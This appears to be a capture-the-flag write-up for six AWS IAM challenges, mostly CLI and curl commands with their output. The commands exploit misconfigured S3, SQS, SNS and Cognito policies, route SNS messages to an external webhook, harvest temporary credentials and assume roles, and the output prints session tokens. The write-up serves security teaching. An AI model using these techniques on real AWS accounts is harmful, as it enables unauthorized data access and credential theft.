---

# THE BIG IAM CHALLEGE 
- https://bigiamchallenge.com/challenge/1
---

## [Challenge 1 - Buckets of Fun](https://bigiamchallenge.com/challenge/1)
### We all know that public buckets are risky. But can you find the flag?

<img width="1396" alt="Screenshot 2025-04-10 at 1 09 16 AM" src="https://github.com/user-attachments/assets/eb889558-9f4c-4077-81bb-f0bd68a817d3" />

#### IAM POLICY
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```


## Solution

```bash
> aws s3 ls s3://thebigiamchallenge-storage-9979f4b
                           PRE files/
> aws s3 ls s3://thebigiamchallenge-storage-9979f4b --recursive
2023-06-05 19:13:53         37 files/flag1.txt
2023-06-08 19:18:24      81889 files/logo.png
> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -
{wiz:exposed-storage-risky-as-usual}
> 
 ```

---

---


## [Challenge 2 - Google Analytics](https://bigiamchallenge.com/challenge/2)

### We created our own analytics system specifically for this challenge. We think it's so good that we even used it on this page. What could go wrong? Join our queue and get the secret flag.


IAM POLICY

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

## Solution

In the source page you will find:

<img width="1400" alt="Screenshot 2025-04-10 at 1 37 16 AM" src="https://github.com/user-attachments/assets/af7ca1c3-a1c4-4d3b-aba3-585d7214cadf" />

```json
// Initialize the Amazon Cognito credentials provider
  AWS.config.region = 'us-east-1';
AWS.config.credentials = new AWS.CognitoIdentityCredentials({IdentityPoolId: 'us-east-1:c6f3eb2e-3cb5-404e-93bc-f0bdf7ad042e'});
// Set the region
AWS.config.update({region: 'us-east-1'});

// Create an SQS service object for Web Analytics.
// Log trafic from all users into SQS.
var sqs = new AWS.SQS({apiVersion: '2012-11-05'});

var params = {
  DelaySeconds: 0,
  MessageBody: JSON.stringify({"URL": document.location.href, "User-Agent": navigator.userAgent, "IsAdmin": false}),
  QueueUrl: "https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2"
};

sqs.sendMessage(params, function(err, data) {
  if (err) {
    console.log("Error", err);
  } else {
    console.log("Success", data.MessageId);
  }
});
```

```bash
> aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2 -
-attribute-names All --message-attribute-names All --max-number-of-messages 10
{
    "Messages": [
        {
            "MessageId": "1a901338-3c28-4f9c-838e-08ad403afc39",
            "ReceiptHandle": "AQEBgGA1H/4osMm10hmRaZHLyN8XDQxzqBimU8LpiT21usZDEwp4EwbrSZNXTTamEJIj4SIwDLOPokBM1EVF5K/6EcgYTnJ
E82eheswF/nIZl+t2GTbcjQ1v3pP9vm0ijdCWqQaQ472EDLj2KF/TEL/lEQVsJFhfTJwLONKlavXpyuFQF+Sj6AsW2UEFfKdQVsQu4Q2rbk+mgNHI6HpU68MN2LUz
qZDh1tHWGoJA1OJvQSY2PxaD7vr644gFMwwoznpzcdw7ItrYI3PbBvkA4fmcR6ifJWxdYayz6Hrlgu3BuUrlZDAGFIIF5BB/vEs8gIAu/JNZhzaBxulWBqwRiKHBc
5u7LybpfbExBCFrudUO5PYvgc6XNb8QDI575iLf5R9oYGleQ7dH4+ffeN8SOzxwhI1i3Sipwe5dsA4DbvRL414=",
            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\"
: \"Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}",
            "Attributes": {
                "SenderId": "AROARK7LBOHXGHGQ5XCT5:tbic-wiz-send-flag-to-sqs-8d265a4",
                "ApproximateFirstReceiveTimestamp": "1744230603499",
                "ApproximateReceiveCount": "1",
                "SentTimestamp": "1744227388406",
                "AWSTraceHeader": "Root=1-67f6cc3c-2501b4910e004349426d8006;Parent=73146ee07a1ed731;Sampled=0;Lineage=1:037be
d70:0"
            }
        },
> curl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html
{wiz:you-are-at-the-front-of-the-queue}
```

---

---

## [Challege 3 - Enable Push Notifications](https://bigiamchallenge.com/challenge/3)

### We got a message for you. Can you get it?

IAM POLICY 

```bash
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

## Solution

According to the policy, anyone can sign up for TBICWizPushNotifications alerts, but there is a requirement that the endpoint ends in @tbic.wiz.io.
Since we don't have any emails that finish in that domain, we can utilize webhooks to subscribe to it using a different protocol, such as HTTPS.  The URL is 
https://webhook.site

``` aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://webhook.site/{your-assigend-id}/@tbic.wiz.io```

```bash
> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-e
ndpoint https://webhook.site/5c092bc0-4639-410f-b110-1277b64f1592/@tbic.wiz.io
{
    "SubscriptionArn": "pending confirmation"
}
>
```

Now check the webook website:

<img width="1368" alt="Screenshot 2025-04-10 at 2 21 53 AM" src="https://github.com/user-attachments/assets/208f10e5-6702-4af9-bc61-b567c05a0ecb" />

On the webhook dashboard, you will find a POST notification indicating Subscription confirmation. To validate the subscription for notifications, please go to the URL provided in the SubscribeURL within the confirmation message. Once you confirm, you will receive the flag as part of the message.


<img width="1395" alt="Screenshot 2025-04-10 at 2 18 06 AM" src="https://github.com/user-attachments/assets/64944856-c872-4ab6-93e5-d38800486699" />

---

---

## [Challenge 4 - Admin only?](https://bigiamchallenge.com/challenge/4)

 ### We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?

IAM POLICY

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```

## Solution

As long as the prefix is files/* and the user arn is arn:aws:iam::133713371337:user/admin, the policy permits anyone to list the objects and download them from the bucket thebigiamchallenge-admin-storage-abf1321.


```bash
> curl "https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321?prefix=files/"
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>thebigiamchallenge-admin-storage-abf1321</Name><Prefi
x>files/</Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>files/flag-as-admin.t
xt</Key><LastModified>2023-06-07T19:15:43.000Z</LastModified><ETag>"e365cfa7365164c05d7a9c209c4d8514"</ETag><Size>42</Size><S
torageClass>STANDARD</StorageClass></Contents><Contents><Key>files/logo-admin.png</Key><LastModified>2023-06-08T19:20:01.000Z
</LastModified><ETag>"c57e95e6d6c138818bf38daac6216356"</ETag><Size>81889</Size><StorageClass>STANDARD</StorageClass></Conten
ts></ListBucketResult>
> curl "https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt"
{wiz:principal-arn-is-not-what-you-think}
> 
```

---
---

## [Challenge 5 - Do I know you?](https://bigiamchallenge.com/challenge/5)

### We configured AWS Cognito as our main identity provider. Let's hope we didn't make any mistakes.


IAM POLICY

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "VisualEditor0",
            "Effect": "Allow",
            "Action": [
                "mobileanalytics:PutEvents",
                "cognito-sync:*"
            ],
            "Resource": "*"
        },
        {
            "Sid": "VisualEditor1",
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::wiz-privatefiles",
                "arn:aws:s3:::wiz-privatefiles/*"
            ]
        }
    ]
}
```

## Solution

From the inspect console we can get the temporary credentials that were created by the javascript.

```AWS.config.credentials```

<img width="1396" alt="Screenshot 2025-04-11 at 11 25 11 PM" src="https://github.com/user-attachments/assets/5c96dfcf-a1ac-41cc-84f0-1a22185d0550" />

use it in the cli

```bash
export AWS_ACCESS_KEY_ID=ASIA....
export AWS_SECRET_ACCESS_KEY=983JOhp3lyE939hX7/Jr.....
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEI3//////////wEa............
```

```bash
aws s3 ls s3://wiz-privatefiles/
# 2025-04-11 21:42:27       4220 cognito1.png
# 2025-04-11 15:28:35         37 flag1.txt

aws s3 cp s3://wiz-privatefiles/flag1.txt flag5.txt

cat flag5.txt
# {wiz:incognito-is-always-suspicious}
```

---

---


## [Challenge 6 - One final push](https://bigiamchallenge.com/challenge/6)

### Anonymous access no more. Let's see what can you do now. Now try it with the authenticated role: arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role

IAM POLICY

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "cognito-identity.amazonaws.com"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "cognito-identity.amazonaws.com:aud": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
                }
            }
        }
    ]
}
```

## Solution


```bash
> aws cognito-identity get-id --region us-east-1 --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
{
    "IdentityId": "us-east-1:157d6171-eec6-c333-57bf-b5cad9b6d450"
}

> aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-na
me iam-challenge-6 --web-identity-token 'eyJraWQiOiJ1cy1lYXN0LTEtNyIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0
LTE6MTU3ZDYxNzEtZWVjNi1jMzM
zLTU3YmYtYjVjYWQ5YjZkNDUwIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRp
Y2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3NDQzOTYyNjYsImlhdCI6MTc0NDM5NTY2Nn0.PYGTk
sOkKZTiPPK_e_fuaEV9ANMjUqvM6YHs1yRDTqAPATUdWFf6AyhkqEjImfbFjMjgchlyZ10ocoz08PkICC2xDUkEx4w0PDTRKanvbvP-YIV1umBFtSMPKq3HDXv13c
pRMyqS8WGyvXE26C5bp51lyGIjkhSQysMep_VWlDkywpCkwxm9lx_215fzouMU3oUZTn8i-cDRDvS87_QX2QHuX_0snZVXyxV7r_OysnlNHQH4-bMY19d6s4h82on
3-4k1IuhwXleAgpSg7M8kuc7EqBoHnexQFRo5vqhIgVjfHW0ICaPzK7NWuYDhDjtx9xvT0pLYrTq5Qu16s_cpgA'
An error occurred (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Token signature invalid
> aws sts assume-role-with-web-identity --role-arn arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role --role-session-na
me iam-challenge-6 --web-identity-token 'eyJraWQiOiJ1cy1lYXN0LTEtNyIsInR5cCI6IkpXUyIsImFsZyI6IlJTNTEyIn0.eyJzdWIiOiJ1cy1lYXN0
LTE6MTU3ZDYxNzEtZWVjNi1jMzMzLTU3YmYtYjVjYWQ5YjZkNDUwIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzY
iIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3NDQzOTYyNjYsIm
lhdCI6MTc0NDM5NTY2Nn0.PYGTksOkKZTiPPK_e_fuaEV9ANMjUqvM6YHs1yRDTqAPATUdWFf6AyhkqEjImfbFjMjgchlyZ10ocoz08PkICC2xDUkEx4w0PDTRKan
vbvP-YIV1umBFtSMPKq3HDXv13cpRMyqS8WGyvXE26C5bp51lyGIjkhSQysMep_VWlDkywpCkwxm9lx_215fzouMU3oUZTn8i-cDRDvS87_QX2QHuX_0snZVXyxV7
r_OysnlNHQH4-bMY19d6s4h82on3-4k1IuhwXleAgpSg7M8kuc7EqBoHnexQFRo5vqhIgVjfHW0ICaPzK7NWuYDhDjtx9xvT0pLYrTq5Qu16s_cpgA'
{
    "Credentials": {
        "AccessKeyId": "ASIARK7LBOHXAYNLJGZJ",
        "SecretAccessKey": "/oib+Ktm5q+TOq4EMpp7vQuXbObuIiazUhzRmD55",
        "SessionToken": "FwoGZXIvYXdzEFwaDNmh4nmbCXIiE6al6yKnAsq4ixtS9wUAoUQHQU+L6lbBf4fRqirXAVL6nqUEttk6xs9VUPdgjw70nKgUmXRV
jFsPyE542EZ5iEBiyPmYrwhVHZkK4/zQAqDDg4qS9pIuyZ+8PZ25J14W+ke/joiKcfa65f6svx3hWeqR2m82h3juTmR3EtrhcCK5Fc0Ow3iXNgTNKLzU5pdEZ3Ysn
tFJoLDqtl7uq5+viCTt+M1HiGnXQIzVFOPM3dXVrtn+9ciCHK7VGP32G25yymyaMk6kgCJdq7IH+F27DbZE97toY3y0fGG9I1578bcNcc5EqTCvRiH6asvYo3H6W4
fGFPIIgwP3sCdLrXv1eM4Df81qjxMBqHcfVaJfT4pJ5EMAcQsvnk9ncUaMCzIrujUb58TA5kzMq6DVKlUovbzlvwYylgFn8LkfhjXZHzZgx4WuWRjfHH3yUAZ9v6I
FkV4+KmOucYoUV24rmj8RmOhZ37RJ6b6DyeAR9eAQ4TkW4qdMZQyQAhl5rMQzJc5zNGj+H/OlWVRjjY4JoXdVtcnkQ7nznMdmMslGdT+FL0oDkk5rM2NbKZLTNlh4
O1JV4KJNAeYgZIlpHVNREM9FBfOnrFFAHzsGWkHN7aY=",
        "Expiration": "2025-04-11T19:23:57Z"
    },
    "SubjectFromWebIdentityToken": "us-east-1:157d6171-eec6-c333-57bf-b5cad9b6d450",
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:iam-challenge-6",
        "Arn": "arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/iam-challenge-6"
    },
    "Provider": "cognito-identity.amazonaws.com",
    "Audience": "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}


> export AWS_ACCESS_KEY_ID=ASIA..............
> export AWS_SECRET_ACCESS_KEY=/oib+Ktm5q+TOq4E............
> export AWS_SESSION_TOKEN=FwoGZXIv..........

> aws s3 cp s3://wiz-privatefiles-x1000/flag2.txt -
{wiz:open-sesame-or-shell-i-say-openid}
```

---
---


